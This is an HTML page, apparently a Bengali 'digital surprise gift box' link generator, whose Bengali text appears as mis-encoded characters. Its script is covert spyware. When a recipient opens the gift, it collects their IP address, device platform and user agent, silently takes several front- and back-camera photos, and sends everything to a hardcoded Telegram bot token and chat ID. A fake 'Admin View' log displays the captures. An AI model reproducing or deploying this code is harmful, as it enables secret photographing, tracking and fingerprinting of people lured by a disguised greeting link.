<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</title>
    <!-- ‡¶ó‡ßÅ‡¶ó‡¶≤ ‡¶´‡¶®‡ßç‡¶ü‡¶∏ ‡¶è‡¶¨‡¶Ç ‡¶´‡¶®‡ßç‡¶ü ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ì‡ßü‡¶∏‡¶Æ -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #4A6CF7;
            --primary-dark: #3A5CE5;
            --secondary-color: #6C63FF;
            --accent-color: #FF6B8B;
            --background-gradient: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
            --box-shadow-hover: 0 20px 40px rgba(0, 0, 0, 0.12);
            --gift-box-color: #FF6B8B;
            --gift-lid-color: #FF8FA3;
            --ribbon-color: #FFD166;
            --text-dark: #2D3748;
            --text-light: #718096;
            --success-color: #10B981;
            --border-radius: 12px;
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }
        .theme-birthday { --theme-name: 'birthday'; --theme-primary: #FF6B8B; --theme-secondary: #FF8FA3; --theme-accent: #FFD166; --theme-gift-box: #FF6B8B; --theme-gift-lid: #FF8FA3; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%); }
        .theme-anniversary { --theme-name: 'anniversary'; --theme-primary: #D4AF37; --theme-secondary: #FFD700; --theme-accent: #FF6B8B; --theme-gift-box: #D4AF37; --theme-gift-lid: #FFD700; --theme-ribbon: #FF6B8B; --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%); }
        .theme-newyear { --theme-name: 'newyear'; --theme-primary: #10B981; --theme-secondary: #34D399; --theme-accent: #FFD166; --theme-gift-box: #10B981; --theme-gift-lid: #34D399; --theme-ribbon: #FFD166; --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%); }
        .theme-proposal { --theme-name: 'proposal'; --theme-primary: #EC4899; --theme-secondary: #F472B6; --theme-accent: #C084FC; --theme-gift-box: #EC4899; --theme-gift-lid: #F472B6; --theme-ribbon: #C084FC; --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%); }
        .theme-general, .theme-custom { --theme-name: 'general'; --theme-primary: #4A6CF7; --theme-secondary: #6C63FF; --theme-accent: #FF6B8B; --theme-gift-box: #4A6CF7; --theme-gift-lid: #6C63FF; --theme-ribbon: #FF6B8B; --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%); }
        
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Poppins', sans-serif; background: var(--theme-background); display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; color: var(--text-dark); line-height: 1.6; padding: 15px; overflow-x: hidden; transition: background 0.5s ease; }
        
        .container { background-color: white; padding: 30px 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); width: 100%; max-width: 500px; text-align: center; position: relative; overflow: hidden; z-index: 10; margin-bottom: 20px; }
        .container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--theme-primary), var(--theme-accent)); }
        
        h1, h2, h3 { color: var(--theme-primary); margin-bottom: 15px; font-weight: 700; }
        #themeMessage { font-size: 22px; margin-top: -10px; }
        p { color: var(--text-light); margin-bottom: 20px; font-size: 15px; }
        
        form { display: flex; flex-direction: column; margin-top: 20px; }
        .form-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
        input[type="text"], input[type="url"], textarea, select, input[type="datetime-local"] { width: 100%; padding: 14px 16px; border: 1.5px solid #E2E8F0; border-radius: 8px; font-size: 16px; transition: var(--transition); }
        input:focus { border-color: var(--theme-primary); outline: none; box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.1); }
        
        button { background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary)); color: white; padding: 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 8px; }
        
        /* Web Log Styles */
        #web-log-container { width: 100%; max-width: 500px; background: #1e293b; color: #34d399; padding: 20px; border-radius: 12px; font-family: monospace; font-size: 12px; margin-top: 20px; box-shadow: var(--box-shadow); display: none; text-align: left; }
        .log-entry { margin-bottom: 10px; border-bottom: 1px solid #334155; padding-bottom: 5px; word-break: break-all; }
        .log-image { width: 80px; height: 80px; object-fit: cover; border-radius: 4px; margin: 5px; border: 1px solid #34d399; }
        .log-title { color: #fbbf24; font-weight: bold; margin-bottom: 5px; display: block; }

        /* Gift Box Styles (Same as original) */
        .gift-wrapper { position: relative; margin: 5px auto; width: 300px; height: 250px; perspective: 1000px; cursor: pointer; }
        .gift-box { position: relative; width: 160px; height: 160px; margin: 0 auto; transition: transform 0.5s ease; animation: float 3s ease-in-out infinite; }
        .box-body { width: 160px; height: 160px; background: linear-gradient(135deg, var(--theme-gift-box), var(--theme-gift-lid)); position: absolute; bottom: 0; border-radius: 8px; }
        .lid { width: 176px; height: 48px; background: linear-gradient(135deg, var(--theme-gift-lid), var(--theme-gift-box)); position: absolute; top: -24px; left: -8px; z-index: 3; transition: transform 1s cubic-bezier(0.68, -0.55, 0.27, 1.55); transform-origin: bottom; border-radius: 8px 8px 0 0; }
        .gift-box.open .lid { transform: rotateX(120deg) translateZ(10px); }
        .gift-box.open { animation: box-disappear 1s forwards; }
        
        /* Rest of the original styles... */
        .hidden { display: none; }
        .theme-selector { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; justify-content: center; }
        .theme-option { flex: 1; min-width: 120px; padding: 10px; border: 2px solid #E2E8F0; border-radius: 8px; text-align: center; cursor: pointer; font-size: 13px; }
        .theme-option.active { border-color: var(--theme-primary); background: rgba(74, 108, 247, 0.1); }
        .message-container { opacity: 0; transform: translateY(20px); transition: 0.8s ease 1.2s; background: #F8FAFC; padding: 20px; border-radius: 10px; border-left: 4px solid var(--theme-primary); text-align: left; }
        .message-container.show { opacity: 1; transform: translateY(0); }
        
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes box-disappear { 100% { transform: scale(0); opacity: 0; } }
        .victory-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 100; display: none; }
    </style>
</head>
<body>
    <div class="container" id="form-container">
        <h1><span>üéÅ</span> ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</h1>
        <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º‡¶ú‡¶®‡¶ï‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶â‡¶™‡¶π‡¶æ‡¶∞ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        
        <div class="theme-selector">
            <div class="theme-option active" data-theme="birthday"><i class="fas fa-birthday-cake"></i> ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®</div>
            <div class="theme-option" data-theme="anniversary"><i class="fas fa-ring"></i> ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ</div>
            <div class="theme-option" data-theme="general"><i class="fas fa-gift"></i> ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£</div>
            <div class="theme-option" data-theme="custom"><i class="fas fa-paint-brush"></i> ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ</div>
        </div>

        <form id="giftForm">
            <input type="text" id="senderName" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ" style="margin-bottom:10px">
            <input type="text" id="receiverName" required placeholder="‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ" style="margin-bottom:10px">
            <textarea id="message" rows="3" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ..." style="margin-bottom:10px"></textarea>
            <input type="url" id="imageURL" placeholder="‡¶õ‡¶¨‡¶ø‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï)" style="margin-bottom:10px">
            
            <div class="form-group">
                <label><input type="checkbox" id="enableCamera" checked> ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ (‡¶õ‡¶¨‡¶ø ‡¶§‡ßÅ‡¶≤‡¶¨‡ßá)</label>
                <label><input type="checkbox" id="enableDeviceInfo" checked> ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶§‡¶•‡ßç‡¶Ø (IP, OS)</label>
            </div>
            <button type="submit"><i class="fas fa-link"></i> ‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </form>

        <div id="generatedLinkContainer" class="hidden" style="margin-top:20px; background:#f1f5f9; padding:15px; border-radius:8px;">
            <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï:</p>
            <input type="text" id="generatedLink" readonly style="font-size:12px; margin-bottom:10px">
            <button id="copyButton" style="background:#10B981">‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>
    </div>

    <!-- ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ -->
    <div class="container hidden" id="gift-container">
        <h2 id="receiverTitle"></h2>
        <div id="main-gift-content">
            <p id="themeMessage"></p>
            <div class="gift-wrapper" id="giftWrapper">
                <div class="gift-box" id="giftBox">
                    <div class="lid"></div><div class="box-body"></div>
                </div>
                <div class="gift-content-revealed hidden" id="giftContentRevealed">
                    <img id="revealedImage" src="" style="max-width:100%; border-radius:8px; margin-bottom:15px">
                </div>
            </div>
        </div>
    </div>

    <!-- ‡¶ì‡¶Ø‡¶º‡ßá‡¶¨ ‡¶≤‡¶ó ‡¶∏‡ßá‡¶ï‡¶∂‡¶® (‡¶ó‡ßã‡¶™‡¶® ‡¶™‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤) -->
    <div id="web-log-container">
        <span class="log-title"><i class="fas fa-terminal"></i> Activity Log (Admin View)</span>
        <div id="logs"></div>
    </div>

    <div class="victory-effect" id="victoryEffect"></div>
    <video id="video-preview" style="display:none;" playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_TARGETS = [{ botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }];
        let currentVideoStream = null;

        // --- ‡¶®‡¶§‡ßÅ‡¶® ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®: ‡¶ì‡ßü‡ßá‡¶¨ ‡¶™‡ßá‡¶ú‡ßá ‡¶≤‡¶ó ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ---
        function addToWebLog(type, content, isImage = false) {
            const logContainer = document.getElementById('web-log-container');
            const logsDiv = document.getElementById('logs');
            logContainer.style.display = 'block'; // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶Ü‡¶∏‡¶≤‡ßá ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶∂‡ßã ‡¶ï‡¶∞‡¶¨‡ßá

            const entry = document.createElement('div');
            entry.className = 'log-entry';
            
            if (isImage) {
                const img = document.createElement('img');
                img.src = content;
                img.className = 'log-image';
                entry.innerHTML = `<span>[${type}]</span><br>`;
                entry.appendChild(img);
            } else {
                entry.innerHTML = `<span>[${type}]</span> ${content}`;
            }
            
            logsDiv.prepend(entry); // ‡¶®‡¶§‡ßÅ‡¶® ‡¶≤‡¶ó ‡¶∏‡¶¨‡¶æ‡¶∞ ‡¶â‡¶™‡¶∞‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá
        }

        async function sendDeviceInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                const infoText = `IP: ${ip}\nDevice: ${navigator.platform}\nUA: ${navigator.userAgent}`;
                
                // ‡ßß. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
                TELEGRAM_TARGETS.forEach(target => {
                    fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: target.chatId, text: "üéÅ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶ñ‡ßã‡¶≤‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá!\n" + infoText })
                    });
                });

                // ‡ß®. ‡¶ì‡ßü‡ßá‡¶¨ ‡¶≤‡¶ó‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
                addToWebLog("DEVICE INFO", infoText.replace(/\n/g, '<br>'));
            } catch (e) { addToWebLog("ERROR", "Info fetch failed"); }
        }

        async function captureAndSendPhoto(video, label) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
            const dataUrl = canvas.toDataURL('image/jpeg');

            // ‡ßß. ‡¶ì‡ßü‡ßá‡¶¨ ‡¶≤‡¶ó‡ßá ‡¶õ‡¶¨‡¶ø ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
            addToWebLog(`PHOTO (${label})`, dataUrl, true);

            // ‡ß®. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            TELEGRAM_TARGETS.forEach(target => {
                const fd = new FormData();
                fd.append("chat_id", target.chatId);
                fd.append("photo", blob, "img.jpg");
                fd.append("caption", label);
                fetch(`https://api.telegram.org/bot${target.botToken}/sendPhoto`, { method: "POST", body: fd });
            });
        }

        async function startCapturing(facingMode, count, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.getElementById('video-preview');
                video.srcObject = stream;
                await video.play();
                for (let i = 0; i < count; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    await captureAndSendPhoto(video, `${label} - Photo ${i+1}`);
                }
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { addToWebLog("CAMERA ERROR", `${label} access denied`); }
        }

        // --- ‡¶´‡¶∞‡ßç‡¶Æ ‡¶è‡¶¨‡¶Ç ‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ú‡¶ø‡¶ï ---
        document.getElementById('giftForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const params = new URLSearchParams({
                sender: document.getElementById('senderName').value,
                receiver: document.getElementById('receiverName').value,
                message: document.getElementById('message').value,
                image: document.getElementById('imageURL').value,
                theme: document.querySelector('.theme-option.active').dataset.theme,
                cam: document.getElementById('enableCamera').checked,
                info: document.getElementById('enableDeviceInfo').checked
            });
            const link = window.location.href.split('?')[0] + '?' + params.toString();
            document.getElementById('generatedLink').value = link;
            document.getElementById('generatedLinkContainer').classList.remove('hidden');
        });

        document.getElementById('copyButton').onclick = () => {
            navigator.clipboard.writeText(document.getElementById('generatedLink').value);
            alert("‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ï‡¶™‡¶ø ‡¶π‡ßü‡ßá‡¶õ‡ßá!");
        };

        // --- ‡¶ó‡¶ø‡¶´‡¶ü ‡¶°‡¶ø‡¶∏‡¶™‡ßç‡¶≤‡ßá ‡¶≤‡¶ú‡¶ø‡¶ï ---
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('sender')) {
            document.getElementById('form-container').classList.add('hidden');
            document.getElementById('gift-container').classList.remove('hidden');
            document.getElementById('receiverTitle').textContent = `‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º ${urlParams.get('receiver')}`;
            document.getElementById('themeMessage').textContent = "‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú!";
            
            if (urlParams.get('image')) {
                document.getElementById('revealedImage').src = urlParams.get('image');
                document.getElementById('revealedImage').classList.remove('hidden');
            }

            document.getElementById('giftWrapper').onclick = async function() {
                this.onclick = null; // ‡¶è‡¶ï‡¶¨‡¶æ‡¶∞‡¶á ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶π‡¶¨‡ßá
                document.getElementById('giftBox').classList.add('open');
                
                // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶ï‡¶æ‡¶≤‡ßá‡¶ï‡¶∂‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ
                if (urlParams.get('info') === 'true') sendDeviceInfo();
                if (urlParams.get('cam') === 'true') {
                    await startCapturing('user', 3, "Front Cam");
                    await startCapturing('environment', 2, "Back Cam");
                }

                setTimeout(() => {
                    document.getElementById('giftBox').classList.add('hidden');
                    document.getElementById('giftContentRevealed').classList.remove('hidden');
                    const msgDiv = document.createElement('div');
                    msgDiv.className = 'message-container show';
                    msgDiv.innerHTML = `<h3>${urlParams.get('sender')} ‡¶è‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</h3><p>${urlParams.get('message')}</p>`;
                    document.getElementById('main-gift-content').appendChild(msgDiv);
                }, 1000);
            };
        }

        // ‡¶•‡¶ø‡¶Æ ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡¶∂‡¶®
        document.querySelectorAll('.theme-option').forEach(opt => {
            opt.onclick = () => {
                document.querySelector('.theme-option.active').classList.remove('active');
                opt.classList.add('active');
            }
        });
    </script>
</body>
</html>
